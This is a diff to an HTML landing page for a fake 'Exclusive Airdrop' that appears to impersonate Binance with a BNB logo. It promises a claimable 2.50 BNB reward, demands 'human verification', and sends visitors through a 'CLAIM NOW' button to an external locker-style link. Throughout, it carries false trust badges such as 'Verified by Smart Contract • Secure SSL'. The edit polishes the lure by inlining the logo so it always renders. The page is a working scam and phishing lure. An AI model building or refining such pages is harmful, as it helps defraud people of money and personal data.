@@ -5,34 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Rewards | Exclusive Airdrop</title>
     <style>
-        body { background: #0b0e11; color: #eaecef; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #1e2329; border-radius: 20px; padding: 35px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 360px; border: 1px solid #474d57; }
-        .logo { width: 85px; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(243, 186, 47, 0.4)); }
-        h1 { color: #f3ba2f; margin: 10px 0; font-size: 1.7rem; }
+        body { background: #0b0e11; color: #eaecef; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #1e2329; border-radius: 20px; padding: 35px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 340px; border: 1px solid #474d57; position: relative; }
+        /* شعار BNB مبرمج كـ SVG لضمان الظهور 100% */
+        .logo-svg { width: 70px; height: 70px; margin-bottom: 15px; fill: #f3ba2f; }
+        h1 { color: #f3ba2f; margin: 10px 0; font-size: 1.6rem; }
         p { color: #848e9c; font-size: 0.9rem; line-height: 1.5; }
         .reward-box { background: rgba(243, 186, 47, 0.1); border: 2px dashed #f3ba2f; padding: 15px; margin: 20px 0; border-radius: 12px; }
         .reward-amount { color: #f3ba2f; font-weight: bold; font-size: 1.5rem; }
-        button { background: #f3ba2f; color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 1.1rem; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); }
-        button:hover { background: #ffd25d; transform: translateY(-2px); }
-        .footer { font-size: 0.7rem; color: #474d57; margin-top: 25px; letter-spacing: 1px; }
+        button { background: #f3ba2f; color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ffd25d; transform: scale(1.02); }
+        .footer { font-size: 0.7rem; color: #474d57; margin-top: 25px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB" class="logo">
+        <svg class="logo-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M16.624 13.9202l-4.624 4.624-4.624-4.624 4.624-4.624 4.624 4.624zm3.696-3.696l-3.696-3.696 3.696-3.696 3.696 3.696-3.696 3.696zm-11.088 0l-3.696-3.696 3.696-3.696 3.696 3.696-3.696 3.696zm3.696 11.088l-3.696-3.696 3.696-3.696 3.696 3.696-3.696 3.696zm3.696-11.088l3.696 3.696-3.696 3.696-3.696-3.696 3.696-3.696z"/></svg>
         <h1>Exclusive Airdrop</h1>
-        <p>Congratulations! You are eligible for the 2026 Community Rewards Program.</p>
+        <p>Congratulations! You are eligible for the 2026 Rewards Program.</p>
         <div class="reward-box">
-            <span>Claimable Balance:</span><br>
-            <span class="reward-amount">2.50 BNB / 0.55 ETH</span>
+            <span>Claimable Reward:</span><br>
+            <span class="reward-amount">2.50 BNB</span>
         </div>
-        <p style="margin-bottom: 25px;">To prevent automated bots, please complete human verification.</p>
-        
-        <a href="https://checkmyapp.store/cl/i/ex27dl"><button>CLAIM REWARD NOW</button></a>
-        
-        <div class="footer">
-            VERIFIED BY SMART CONTRACT • SECURE
-        </div>
+        <p style="margin-bottom: 25px;">Complete human verification to claim assets.</p>
+        <a href="https://checkmyapp.store/cl/i/ex27dl"><button>CLAIM NOW</button></a>
+        <div class="footer">Verified by Smart Contract • Secure SSL</div>
     </div>
 </body>
 </html>
